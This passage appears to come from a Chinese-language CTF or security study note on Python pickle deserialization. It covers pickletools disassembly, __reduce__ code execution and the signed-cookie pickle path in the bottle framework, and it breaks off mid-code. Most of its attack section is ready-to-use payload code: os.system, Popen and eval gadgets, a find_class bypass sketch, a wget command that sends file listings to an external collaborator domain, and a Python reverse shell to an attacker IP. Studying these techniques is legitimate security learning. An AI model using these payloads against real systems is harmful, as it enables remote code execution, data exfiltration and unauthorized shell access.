class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">&quot;Can&#x27;t load pickle from unicode string&quot;</span>)<br>    file = io.BytesIO(s)<br>    <span class="hljs-keyword">return</span> _Unpickler(file, fix_imports=fix_imports, buffers=buffers,<br>                      encoding=encoding, errors=errors).load()<br></code></pre></td></tr></table></figure><ul><li>可以看出这两个函数其实没什么区别，都是把输入转化为<em><strong>文件流</strong></em>，传给<code>_Unpickler</code>类后调用该类的<code>load()</code>函数</li><li>研究该类的工具：<code>pickletools</code></li></ul><h4 id="pickletools库"><a href="#pickletools库" class="headerlink" title="pickletools库"></a>pickletools库</h4><ul><li><em><strong>pickletools</strong></em>是pythonn自带的<strong>pickle调试器</strong></li><li>能<em><strong>反汇编</strong></em>一个已经被打包的字符串</li><li>能<em><strong>优化</strong></em>一个<strong>已经被打包</strong>的字符串你</li><li>能返回一个迭代器来供程序使用</li><li>借用这个工具能方便的看清楚每条语句的作用，并检测手动构造的字符串<strong>是否合法</strong></li><li></li></ul><h5 id="反汇编功能"><a href="#反汇编功能" class="headerlink" title="反汇编功能"></a>反汇编功能</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">dairy</span>():<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-variable language_">self</span>.date = <span class="hljs-number">114514</span><br><span class="hljs-variable language_">self</span>.text = <span class="hljs-string">&quot;无聊的一天&quot;</span><br><span class="hljs-variable language_">self</span>.todo = [<span class="hljs-string">&quot;分析pickle&quot;</span>,<span class="hljs-string">&quot;吃零食&quot;</span>]<br>x = dairy()<br>s = pickle.dumps(x)<br><span class="hljs-built_in">print</span>(s)<br>pickletools.dis(s)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b&#x27;\x80\x04\x95i\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x05dairy\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x04date\x94JR\xbf\x01\x00\x8c\x04text\x94\x8c\x0f\xe6\x97\xa0\xe8\x81\x8a\xe7\x9a\x84\xe4\xb8\x80\xe5\xa4\xa9\x94\x8c\x04todo\x94]\x94(\x8c\x0c\xe5\x88\x86\xe6\x9e\x90pickle\x94\x8c\t\xe5\x90\x83\xe9\x9b\xb6\xe9\xa3\x9f\x94eub.&#x27;</span><br><span class="hljs-string">    0: \x80 PROTO      4</span><br><span class="hljs-string">    2: \x95 FRAME      105</span><br><span class="hljs-string">   11: \x8c SHORT_BINUNICODE &#x27;__main__&#x27;</span><br><span class="hljs-string">   21: \x94 MEMOIZE    (as 0)</span><br><span class="hljs-string">   22: \x8c SHORT_BINUNICODE &#x27;dairy&#x27;</span><br><span class="hljs-string">   29: \x94 MEMOIZE    (as 1)</span><br><span class="hljs-string">   30: \x93 STACK_GLOBAL</span><br><span class="hljs-string">   31: \x94 MEMOIZE    (as 2)</span><br><span class="hljs-string">   32: )    EMPTY_TUPLE</span><br><span class="hljs-string">   33: \x81 NEWOBJ</span><br><span class="hljs-string">   34: \x94 MEMOIZE    (as 3)</span><br><span class="hljs-string">   35: &#125;    EMPTY_DICT</span><br><span class="hljs-string">   36: \x94 MEMOIZE    (as 4)</span><br><span class="hljs-string">   37: (    MARK</span><br><span class="hljs-string">   38: \x8c     SHORT_BINUNICODE &#x27;date&#x27;</span><br><span class="hljs-string">   44: \x94     MEMOIZE    (as 5)</span><br><span class="hljs-string">   45: J        BININT     114514</span><br><span class="hljs-string">   50: \x8c     SHORT_BINUNICODE &#x27;text&#x27;</span><br><span class="hljs-string">   56: \x94     MEMOIZE    (as 6)</span><br><span class="hljs-string">   57: \x8c     SHORT_BINUNICODE &#x27;无聊的一天&#x27;</span><br><span class="hljs-string">   74: \x94     MEMOIZE    (as 7)</span><br><span class="hljs-string">   75: \x8c     SHORT_BINUNICODE &#x27;todo&#x27;</span><br><span class="hljs-string">   81: \x94     MEMOIZE    (as 8)</span><br><span class="hljs-string">   82: ]        EMPTY_LIST</span><br><span class="hljs-string">   83: \x94     MEMOIZE    (as 9)</span><br><span class="hljs-string">   84: (        MARK</span><br><span class="hljs-string">   85: \x8c         SHORT_BINUNICODE &#x27;分析pickle&#x27;</span><br><span class="hljs-string">   99: \x94         MEMOIZE    (as 10)</span><br><span class="hljs-string">  100: \x8c         SHORT_BINUNICODE &#x27;吃零食&#x27;</span><br><span class="hljs-string">  111: \x94         MEMOIZE    (as 11)</span><br><span class="hljs-string">  112: e            APPENDS    (MARK at 84)</span><br><span class="hljs-string">  113: u        SETITEMS   (MARK at 37)</span><br><span class="hljs-string">  114: b    BUILD</span><br><span class="hljs-string">  115: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 4</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>解析序列化后的字符串，并说明这个字符串都干了什么</li><li><em><strong>每一行都是一条指令</strong></em></li></ul><h5 id="优化功能"><a href="#优化功能" class="headerlink" title="优化功能"></a>优化功能</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">dairy</span>():<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-variable language_">self</span>.date = <span class="hljs-number">114514</span><br><span class="hljs-variable language_">self</span>.text = <span class="hljs-string">&quot;无聊的一天&quot;</span><br><span class="hljs-variable language_">self</span>.todo = [<span class="hljs-string">&quot;分析pickle&quot;</span>,<span class="hljs-string">&quot;吃零食&quot;</span>]<br>x = dairy()<br>s = pickle.dumps(x)<br>s = pickletools.optimize(s)<br><span class="hljs-built_in">print</span>(s)<br>pickletools.dis(s)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b&#x27;\x80\x04\x95]\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x8c\x05dairy\x93)\x81&#125;(\x8c\x04dateJR\xbf\x01\x00\x8c\x04text\x8c\x0f\xe6\x97\xa0\xe8\x81\x8a\xe7\x9a\x84\xe4\xb8\x80\xe5\xa4\xa9\x8c\x04todo](\x8c\x0c\xe5\x88\x86\xe6\x9e\x90pickle\x8c\t\xe5\x90\x83\xe9\x9b\xb6\xe9\xa3\x9feub.&#x27;</span><br><span class="hljs-string">    0: \x80 PROTO      4</span><br><span class="hljs-string">    2: \x95 FRAME      93</span><br><span class="hljs-string">   11: \x8c SHORT_BINUNICODE &#x27;__main__&#x27;</span><br><span class="hljs-string">   21: \x8c SHORT_BINUNICODE &#x27;dairy&#x27;</span><br><span class="hljs-string">   28: \x93 STACK_GLOBAL</span><br><span class="hljs-string">   29: )    EMPTY_TUPLE</span><br><span class="hljs-string">   30: \x81 NEWOBJ</span><br><span class="hljs-string">   31: &#125;    EMPTY_DICT</span><br><span class="hljs-string">   32: (    MARK</span><br><span class="hljs-string">   33: \x8c     SHORT_BINUNICODE &#x27;date&#x27;</span><br><span class="hljs-string">   39: J        BININT     114514</span><br><span class="hljs-string">   44: \x8c     SHORT_BINUNICODE &#x27;text&#x27;</span><br><span class="hljs-string">   50: \x8c     SHORT_BINUNICODE &#x27;无聊的一天&#x27;</span><br><span class="hljs-string">   67: \x8c     SHORT_BINUNICODE &#x27;todo&#x27;</span><br><span class="hljs-string">   73: ]        EMPTY_LIST</span><br><span class="hljs-string">   74: (        MARK</span><br><span class="hljs-string">   75: \x8c         SHORT_BINUNICODE &#x27;分析pickle&#x27;</span><br><span class="hljs-string">   89: \x8c         SHORT_BINUNICODE &#x27;吃零食&#x27;</span><br><span class="hljs-string">  100: e            APPENDS    (MARK at 74)</span><br><span class="hljs-string">  101: u        SETITEMS   (MARK at 32)</span><br><span class="hljs-string">  102: b    BUILD</span><br><span class="hljs-string">  103: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 4</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="魔术方法-reduce-的RCE利用"><a href="#魔术方法-reduce-的RCE利用" class="headerlink" title="魔术方法__reduce__的RCE利用"></a>魔术方法__reduce__的RCE利用</h3><ul><li>是对象序列化机制的一个组成部分，效果和<strong>PHP</strong>的<code>__wakeup</code>差不多，都是在<em><strong>反序列化的时候会自动进行调用</strong></em></li><li>关键：pickle不是简单的数据转换，它会记录对象重建所需的代码逻辑（如调用类的<code>__reduce__</code>方法）</li><li>而与PHP不同的是，<code>__reduce__</code>这个魔术方法是可以人为控制的<ul><li>当使用pickle模块对对象进行序列化&#x2F;反序列化时，如果对象定义了<code>__reduce__</code>方法，pickle就会调用这个方法来获取序列化&#x2F;反序列化所需的信息</li></ul></li><li><strong>通常由对象自己定义</strong>，用于指定如何将对象转换为可序列化的形式，即定义对象如何被<em><strong>序列化或反序列化</strong></em></li><li><em><strong>值得注意的是</strong></em>：<code>__reduce__</code>的执行是在<code>__init__</code>之后的</li><li><em><strong>该函数返回一个元组</strong></em>：<ul><li>第一个元素是<em><strong>可调用对象</strong></em>（如函数、类等）</li><li>第二个元素是<em><strong>调用该可调用对象的参数</strong></em>（<strong>元组</strong>形式）</li><li>后续元素<strong>可选</strong>，如用于<code>__setstate__</code>的状态</li></ul></li><li>相比于其它的魔法方法，<code>__reduce__</code>不需要依赖<strong>对象本身的逻辑</strong>，只需要构造<code>__reduce__</code>返回的元组即可<ul><li>并且只需要反序列化数据中存在<code>__reduce__</code>即可，源代码中存在与否并不重要<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tmp</span>():<br>text = <span class="hljs-string">&quot;456&quot;</span><br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, text</span>):<br><span class="hljs-variable language_">self</span>.text = text<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">return</span> (tmp,(<span class="hljs-string">&quot;123&quot;</span>,))<br> <br>text = tmp(<span class="hljs-string">&#x27;aa&#x27;</span>)<br>sertext = pickle.dumps(text)<br> <br>reltext = pickle.loads(sertext)<br><span class="hljs-built_in">print</span>(reltext.text)<br><span class="hljs-comment"># 此处输出123，可以发现text被覆盖了</span><br><span class="hljs-comment">## 删去__reduce__就会恢复正常</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">exploit</span>:<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">return</span> (os.system,(<span class="hljs-string">&#x27;calc&#x27;</span>,))<br><span class="hljs-comment"># 反序列化时执行 os.system(&#x27;calc&#x27;)（Windows 弹出计算器）</span><br><span class="hljs-comment"># 该函数返回一个元组</span><br><span class="hljs-comment">## 元组第一个元素：可调用的对象（如函数、类）</span><br><span class="hljs-comment">## 元组第二个元素：调用该对象时的参数，用一个元组包含</span><br><span class="hljs-comment">### 为什么要()：表示是元组类型</span><br><span class="hljs-comment">### 为什么要,(逗号)：单元素元组也要在元素后逗号，否则python不会将其识别为元组</span><br>data = pickle.dumps(exploit())<br>pickle.loads(data)  <span class="hljs-comment"># 此处会弹出计算器！</span><br><br><span class="hljs-comment"># payload</span><br><span class="hljs-keyword">import</span> subprocess  <br><span class="hljs-keyword">import</span> pickle  <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):  <br><span class="hljs-keyword">return</span> (subprocess.Popen, ([<span class="hljs-string">&#x27;/bin/sh&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,<span class="hljs-string">&#x27;id&#x27;</span>],))  <br>payload = pickle.dumps(Exploit())  <br>pickle.loads(payload)<br><br><span class="hljs-keyword">import</span> pickle, os  <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):  <br><span class="hljs-keyword">return</span> (os.popen, (<span class="hljs-string">&#x27;id&#x27;</span>,))  <br>payload = pickle.dumps(Exploit())  <br>pickle.loads(payload)<br><br><span class="hljs-keyword">import</span> pickle, builtins  <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):  <br><span class="hljs-comment"># getattr(builtins, &#x27;eval&#x27;)(&quot;__import__(&#x27;os&#x27;).system(&#x27;id&#x27;)&quot;)  </span><br><span class="hljs-keyword">return</span> (<span class="hljs-built_in">getattr</span>(builtins, <span class="hljs-string">&#x27;eval&#x27;</span>), (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;id&#x27;)&quot;</span>,))  <br>payload = pickle.dumps(Exploit())  <br>pickle.loads(payload)<br></code></pre></td></tr></table></figure><h6 id="跳过fine-class检查"><a href="#跳过fine-class检查" class="headerlink" title="跳过fine_class检查"></a>跳过fine_class检查</h6><ul><li>RestrictedUnpickler通过重写<code>find_class()</code>禁止导入模块，但PVM中并非所有操作码都调用<code>find_class</code></li><li>根据官方文档，<code>find_class()</code>在处理全局对象时被触发（<code>GLOBAL/c</code>、协议4中的<code>STACK_GLOBAL/\x93</code>、协议2及以上中的<code>INST/i</code>、<code>OBJ/o</code>等会调用该方法）</li><li>如果攻击者构造不使用这些操作码（如尽量不使用<code>c/i/\x93</code>），就可绕过<code>find_class</code></li><li>例如，可以利用对象自身的属性或特殊方法来间接获得所需函数，无需再触发导入。通过绕过全局导入的操作码序列，可不触发find_class()检查，从而在受限环境中获取eval等函数<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle  <br>  <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):  <br><span class="hljs-comment"># 不直接 import，也不直接 GLOBAL  </span><br><span class="hljs-comment"># 用现有对象的 __class__.__base__.__subclasses__() 拿到 builtins 的 eval  </span><br>builtins_eval = ().__class__.__base__.__subclasses__()[<span class="hljs-number">138</span>]  <span class="hljs-comment"># 假设138是catch_warnings类  </span><br><span class="hljs-comment"># 这里要遍历找到builtins模块再找eval  </span><br><span class="hljs-keyword">return</span> (builtins_eval, ())  <br>  <br><span class="hljs-comment"># 注意：这个是思路示例，实际要找到路径对应的类索引  </span><br>payload = pickle.dumps(Exploit())<br></code></pre></td></tr></table></figure></li></ul><h6 id="无回显外带"><a href="#无回显外带" class="headerlink" title="无回显外带"></a>无回显外带</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle  <br><span class="hljs-keyword">import</span> os  <br><span class="hljs-keyword">import</span> base64  <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span>:  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):  <br><span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&#x27;wget tvs9lnb4c9choqoskqogia002r8iwbk0.oastify.com/`ls | tr &quot;\n&quot; &quot;_&quot;`&#x27;</span>,))  <br>  <span class="hljs-comment"># 由于外带的内容中如果存在换行的情况，会导致wget 命令无法正确解析域名，因此可以用上面的方法列出所有文件</span><br>payload = pickle.dumps(Evil())  <br><span class="hljs-built_in">print</span>(base64.b64encode(payload))<br><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&#x27;&#x27;&#x27;python3 -c &quot;import os</span><br><span class="hljs-string">import socket</span><br><span class="hljs-string">import subprocess</span><br><span class="hljs-string">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="hljs-string">s.connect((&#x27;&lt;Your IP&gt;&#x27;, 2333))</span><br><span class="hljs-string">os.dup2(s.fileno(), 0)</span><br><span class="hljs-string">os.dup2(s.fileno(), 1)</span><br><span class="hljs-string">os.dup2(s.fileno(), 2)</span><br><span class="hljs-string">subprocess.call([&#x27;/bin/sh&#x27;, &#x27;-i&#x27;])&quot;&#x27;&#x27;&#x27;</span>,))<br><span class="hljs-comment"># -c:用python3来执行后面字符串形式的命令，这是一种无需创建.py文件即可快速执行python代码的方式</span><br><span class="hljs-comment"># import subprocess:该模块用于创建进程，这里用来启动一个shell</span><br><span class="hljs-comment"># socket.AF_INET:表示使用IPV4地址族</span><br><span class="hljs-comment"># socket.SOCK_STREAM:表示使用TCP协议</span><br><span class="hljs-comment"># s.fileno():获取socket连接的文件描述符</span><br><span class="hljs-comment"># os.dup2(s.fileno(),num):把该进程的文件描述符重定向到socket连接</span><br><span class="hljs-comment"># subprocess.call():执行一个外部命令</span><br><br><br>payload = pickle.dumps(Exploit())<br>hex_token = binascii.hexlify(payload).decode()<br><span class="hljs-comment"># decode():将字节串 bytes对象 解码为 str对象，这两个对象不能混合操作</span><br><span class="hljs-built_in">print</span>(hex_token)<br><span class="hljs-built_in">print</span>(payload)<br><br>obj = pickle.loads(payload)<br><br></code></pre></td></tr></table></figure><h3 id="bottle-request里的反序列化"><a href="#bottle-request里的反序列化" class="headerlink" title="bottle.request里的反序列化"></a>bottle.request里的反序列化</h3><h4 id="get-cookie"><a href="#get-cookie" class="headerlink" title="get_cookie()"></a>get_cookie()</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_cookie</span>(<span class="hljs-params">self, key, default=<span class="hljs-literal">None</span>, secret=<span class="hljs-literal">None</span>, digestmod=hashlib.sha256</span>):<br>        <span class="hljs-string">&quot;&quot;&quot; Return the content of a cookie. To read a `Signed Cookie`, the</span><br><span class="hljs-string">            `secret` must match the one used to create the cookie (see</span><br><span class="hljs-string">            :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing</span><br><span class="hljs-string">            cookie or wrong signature), return a default value. &quot;&quot;&quot;</span><br>        value = <span class="hljs-variable language_">self</span>.cookies.get(key) <span class="hljs-comment"># 从cookie中获得指定键名的cookie值</span><br>        <span class="hljs-keyword">if</span> secret: <span class="hljs-comment"># 如果提供了secret，则要进行签名验证来确保cookie的完整性和安全性</span><br>            <span class="hljs-comment"># See BaseResponse.set_cookie for details on signed cookies.</span><br>            <span class="hljs-keyword">if</span> value <span class="hljs-keyword">and</span> value.startswith(<span class="hljs-string">&#x27;!&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;?&#x27;</span> <span class="hljs-keyword">in</span> value:<br>            <span class="hljs-comment"># 检查value存在，并且是否以!开头，?是用来分割签名（sig）和消息（msg）的标识</span><br>                sig, msg = <span class="hljs-built_in">map</span>(tob, value[<span class="hljs-number">1</span>:].split(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-number">1</span>))<br>                <span class="hljs-comment"># 跳过!，根据?分割取出签名和消息，用tob函数将字符串转换为字节</span><br>                <span class="hljs-built_in">hash</span> = hmac.new(tob(secret), msg, digestmod=digestmod).digest()<span class="hljs-comment"># 使用secret,msg生成一个哈希签名用来验证cookie是否被篡改，这里同样使用了HMAC，并利用指定的digestmod算法（默认为hashlib.sha56）来计算哈希</span><br>                <span class="hljs-keyword">if</span> _lscmp(sig, base64.b64encode(<span class="hljs-built_in">hash</span>)):<span class="hljs-comment"># 使用_lscmp函数进行签名比较，验证是否被篡改</span><br>                    dst = pickle.loads(base64.b64decode(msg))<br>                    <span class="hljs-comment"># 签名通过则对消息进行解码，然后反序列化为原始数据结构</span><br>                    <span class="hljs-keyword">if</span> dst <span class="hljs-keyword">and</span> dst[<span class="hljs-number">0</span>] == key:<br>                    <span class="hljs-comment"># 确保解码得到的对象dst不是空，并且其第一个元素与请求的key匹配。如果匹配，则返回该cookie的值dst[1]</span><br>                        <span class="hljs-keyword">return</span> dst[<span class="hljs-number">1</span>]<br>            <span class="hljs-keyword">return</span> default<br>        <span class="hljs-keyword">return</span> value <span class="hljs-keyword">or</span> default<br></code></pre></td></tr></table></figure><ul><li>很明显是利用cookie通过<code>get_cookie</code>的验证抵达反序列化，然后用<code>__reduce__</code>执行代码</li><li>这个函数其实没有验证消息是否是想要的，只是单纯用<strong>密钥</strong>验证是否正确（即通过间接方式验证<em><strong>密钥是否正确</strong></em>）</li></ul><h5 id="set-cookie"><a href="#set-cookie" class="headerlink" title="set_cookie()"></a>set_cookie()</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_cookie</span>(<span class="hljs-params">self, name, value, secret=<span class="hljs-literal">None</span>, digestmod=hashlib.sha256, **options</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>._cookies:<br>            <span class="hljs-variable language_">self</span>._cookies = SimpleCookie()<br>            <span class="hljs-comment"># 检查cookie是否存在，不存在则初始化一个SimpleCookie对象</span><br><br>        <span class="hljs-comment"># Monkey-patch Cookie lib to support &#x27;SameSite&#x27; parameter</span><br>        <span class="hljs-comment"># https://tools.ietf.org/html/draft-west-first-party-cookies-07#section-4.1</span><br>        <span class="hljs-keyword">if</span> py &lt; (<span class="hljs-number">3</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>):<br>            Morsel._reserved.setdefault(<span class="hljs-string">&#x27;samesite&#x27;</span>, <span class="hljs-string">&#x27;SameSite&#x27;</span>)<br>            <span class="hljs-comment"># 兼容旧版本python</span><br><br>        <span class="hljs-keyword">if</span> secret:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(value, basestring):<br>                depr(<span class="hljs-number">0</span>, <span class="hljs-number">13</span>, <span class="hljs-string">&quot;Pickling of arbitrary objects into cookies is &quot;</span><br>                            <span class="hljs-string">&quot;deprecated.&quot;</span>, <span class="hljs-string">&quot;Only store strings in cookies. &quot;</span><br>                            <span class="hljs-string">&quot;JSON strings are fine, too.&quot;</span>)<span class="hljs-comment"># 不是字符串则发出警告，建议不要将任意对象序列化到cookie中</span><br>            encoded = base64.b64encode(pickle.dumps([name, value], -<span class="hljs-number">1</span>))<span class="hljs-comment"># 将cookie的名称和值打包成一个列表，然后进行序列化后base64加密</span><br>            sig = base64.b64encode(hmac.new(tob(secret), encoded,<br>digestmod=digestmod).digest())<span class="hljs-comment"># 生成签名</span><br>            value = touni(tob(<span class="hljs-string">&#x27;!&#x27;</span>) + sig + tob(<span class="hljs-string">&#x27;?&#x27;</span>) + encoded)<br>            <span class="hljs-comment"># 加上!和?标识，标识这是一个签名cookie</span><br>        <span class="hljs-comment"># 看到这就行了</span><br></code></pre></td></tr></table></figure><h5 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h5><ul><li>很明显是要用<code>set_cookie</code>来伪造一个cookie，然后在里面放入想执行的代码<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 